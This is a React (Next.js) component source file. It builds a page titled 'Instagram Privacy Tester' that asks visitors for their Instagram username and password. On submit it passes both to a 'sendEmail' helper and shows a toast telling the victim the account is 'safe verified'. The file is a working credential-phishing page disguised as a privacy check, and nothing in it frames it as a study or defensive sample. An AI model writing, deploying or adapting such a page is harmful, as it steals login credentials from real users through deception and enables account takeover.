"use client";

import { FC } from "react";
import { useForm } from "react-hook-form";
import { sendEmail } from "../utils/send-data";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

export type FormData = {
  username: string;
  password: string;
};

const Contact: FC = () => {
  const { register, handleSubmit } = useForm<FormData>();

  function onSubmit(data: FormData) {
    sendEmail(data);
    toast.success("Your Account is safe verified and is safe");
  }

  return (
    <main className="flex min-h-screen flex-col items-center justify-center bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 p-6">
      <ToastContainer />
      <div className="bg-white p-10 rounded-xl shadow-xl w-full max-w-md">
        <h1 className="text-4xl font-bold text-gray-800 text-center mb-6">Instagram Privacy Tester</h1>
        <form onSubmit={handleSubmit(onSubmit)}>
          <div className="mb-4">
            <input
              type="text"
              placeholder="Enter username"
              className="w-full h-12 rounded-lg pl-3 text-gray-700 border border-gray-300 focus:border-purple-500 focus:outline-none focus:ring-1 focus:ring-purple-500"
              {...register("username", { required: true })}
            />
          </div>
          <div className="mb-6">
            <input
              type="password"
              placeholder="Enter password"
              className="w-full h-12 rounded-lg pl-3 text-gray-700 border border-gray-300 focus:border-purple-500 focus:outline-none focus:ring-1 focus:ring-purple-500"
              {...register("password", { required: true })}
            />
          </div>
          <div className="flex justify-center">
            <button
              type="submit"
              className="w-48 bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition duration-300"
            >
              Submit
            </button>
          </div>
        </form>
      </div>
    </main>
  );
};

export default Contact;
